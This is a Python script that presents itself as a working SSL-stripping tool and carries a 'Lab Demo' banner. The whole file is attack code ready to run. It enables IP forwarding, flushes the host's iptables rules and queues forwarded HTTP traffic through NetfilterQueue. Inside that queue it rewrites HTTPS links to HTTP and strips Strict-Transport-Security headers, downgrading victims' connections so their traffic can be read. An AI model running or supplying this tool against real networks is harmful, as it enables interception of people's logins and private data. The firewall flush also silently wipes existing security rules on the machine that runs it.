#!/usr/bin/env python3
"""
Working SSL Stripper - Intercepts HTTP traffic and strips HTTPS links
Requires: sudo pip3 install netfilterqueue scapy
"""

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import os
import sys

class SSLStripper:
    def __init__(self):
        self.modified_count = 0
        self.packet_count = 0
        
    def process_packet(self, packet):
        """Process each packet from the queue"""
        self.packet_count += 1
        
        try:
            # Convert to scapy packet
            scapy_packet = IP(packet.get_payload())
            
            # Debug: print every 10th packet to show we're processing
            if self.packet_count % 10 == 0:
                print(f"[.] Processed {self.packet_count} packets...", flush=True)
            
            # Only process packets with data (Raw layer)
            if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
                load = scapy_packet[Raw].load
                
                # Check if this is HTTP traffic
                src_port = scapy_packet[TCP].sport
                dst_port = scapy_packet[TCP].dport
                
                if src_port in [80, 8080] or dst_port in [80, 8080]:
                    
                    # Try to decode as text
                    try:
                        original_load = load.decode('utf-8', errors='ignore')
                        
                        # Check if this contains HTTPS links
                        if 'https://' in original_load.lower():
                            print(f"\n[!] FOUND HTTPS in packet!", flush=True)
                            print(f"[+] From: {scapy_packet[IP].src}:{src_port}", flush=True)
                            print(f"[+] To: {scapy_packet[IP].dst}:{dst_port}", flush=True)
                            
                            # Show a snippet
                            snippet = original_load[:200].replace('\r', '').replace('\n', ' ')
                            print(f"[+] Snippet: {snippet}...", flush=True)
                            
                            modified_load = original_load
                            
                            # Strip HTTPS to HTTP
                            modified_load = modified_load.replace('https://', 'http://')
                            modified_load = modified_load.replace('HTTPS://', 'HTTP://')
                            
                            # Strip security headers
                            if 'Strict-Transport-Security' in modified_load:
                                lines = modified_load.split('\r\n')
                                lines = [l for l in lines if not l.startswith('Strict-Transport-Security')]
                                modified_load = '\r\n'.join(lines)
                            
                            print(f"[✓] Stripped HTTPS -> HTTP", flush=True)
                            self.modified_count += 1
                            print(f"[✓] Total modifications: {self.modified_count}\n", flush=True)
                            
                            # Update the packet with modified content
                            scapy_packet[Raw].load = modified_load.encode('utf-8')
                            
                            # Delete checksums so they get recalculated
                            del scapy_packet[IP].len
                            del scapy_packet[IP].chksum
                            del scapy_packet[TCP].chksum
                            
                            # Set the modified packet back
                            packet.set_payload(bytes(scapy_packet))
                    
                    except Exception as e:
                        pass  # Not text data, skip
            
            # Accept the packet (modified or not)
            packet.accept()
            
        except Exception as e:
            print(f"[-] Error processing packet: {e}", flush=True)
            packet.accept()

def setup_iptables():
    """Setup iptables to forward packets to netfilter queue"""
    print("[*] Setting up iptables rules...", flush=True)
    
    # Enable IP forwarding
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
    print("[+] IP forwarding enabled", flush=True)
    
    # Flush existing rules
    os.system("iptables -F")
    os.system("iptables -t nat -F")
    
    # IMPORTANT: Queue packets in FORWARD chain AND locally generated/received
    # This catches traffic being forwarded through this machine
    os.system("iptables -I FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 0")
    os.system("iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0")
    os.system("iptables -I FORWARD -p tcp --sport 8080 -j NFQUEUE --queue-num 0")
    os.system("iptables -I FORWARD -p tcp --dport 8080 -j NFQUEUE --queue-num 0")
    
    # Also catch OUTPUT (packets leaving this machine)
    os.system("iptables -I OUTPUT -p tcp --sport 80 -j NFQUEUE --queue-num 0")
    os.system("iptables -I OUTPUT -p tcp --sport 8080 -j NFQUEUE --queue-num 0")
    
    print("[+] iptables rules configured", flush=True)
    print("[+] Forwarding HTTP traffic (ports 80, 8080) to queue 0", flush=True)
    
    # Show the rules
    print("\n[*] Current FORWARD rules:", flush=True)
    os.system("iptables -L FORWARD -n -v | head -10")
    print()

def cleanup_iptables():
    """Remove iptables rules"""
    print("\n[*] Cleaning up iptables rules...", flush=True)
    os.system("iptables -F")
    os.system("iptables -F OUTPUT")
    os.system("iptables -t nat -F")
    print("[+] iptables rules removed", flush=True)

def main():
    # Check for root
    if os.geteuid() != 0:
        print("[-] This script must be run as root!")
        print("[-] Usage: sudo python3 ssl_strip.py")
        sys.exit(1)
    
    print("=" * 60)
    print("SSL Stripping Attack - Lab Demo")
    print("=" * 60)
    print()
    
    # Setup iptables
    setup_iptables()
    
    # Create stripper instance
    stripper = SSLStripper()
    
    # Create netfilter queue
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, stripper.process_packet)
    
    print()
    print("[+] SSL stripper is running")
    print("[*] Intercepting HTTP traffic and stripping HTTPS links...")
    print("[*] You should see packet count incrementing...")
    print("[*] Press Ctrl+C to stop")
    print()
    
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[*] Stopping SSL stripper...")
    finally:
        nfqueue.unbind()
        cleanup_iptables()
        print(f"[+] Total packets processed: {stripper.packet_count}")
        print(f"[+] Total HTTPS links stripped: {stripper.modified_count}")
        print("[+] Cleanup complete")

if __name__ == "__main__":
    main()
